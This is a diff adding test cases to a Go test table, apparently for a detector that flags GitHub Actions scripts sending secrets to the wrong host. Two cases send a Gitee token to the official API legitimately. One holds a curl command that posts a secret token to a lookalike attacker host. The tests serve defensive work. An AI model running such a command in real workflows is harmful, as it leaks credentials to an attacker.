@@ -168,6 +168,24 @@ result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/re
 			wantErrors:  0,
 			description: "Should NOT flag curl with multi-line JSON body posting to GitHub API",
 		},
+		{
+			name:        "curl with Gitee token to gitee API query string (legitimate)",
+			runScript:   `curl -s "https://gitee.com/api/v5/repos/owner/Stellar/releases/tags/v1.0?access_token=$GITEE_TOKEN"`,
+			wantErrors:  0,
+			description: "Should NOT flag Gitee PAT in query string sent to official gitee.com API (mirror-sync pattern)",
+		},
+		{
+			name:        "curl with Gitee token in form field to gitee API (legitimate)",
+			runScript:   `curl -X POST "https://gitee.com/api/v5/repos/owner/Stellar/releases" -F "access_token=$GITEE_TOKEN" -F "file=@assets/app.apk"`,
+			wantErrors:  0,
+			description: "Should NOT flag Gitee PAT in -F form field sent to official gitee.com API (mirror-sync upload)",
+		},
+		{
+			name:        "curl with Gitee token to attacker-controlled subdomain of gitee-like host",
+			runScript:   `curl -d "access_token=${{ secrets.GITEE }}" https://gitee.com.evil.example/collect`,
+			wantErrors:  1,
+			description: "Should flag Gitee token sent to lookalike host (not gitee.com)",
+		},
 	}
 
 	for _, tt := range tests {
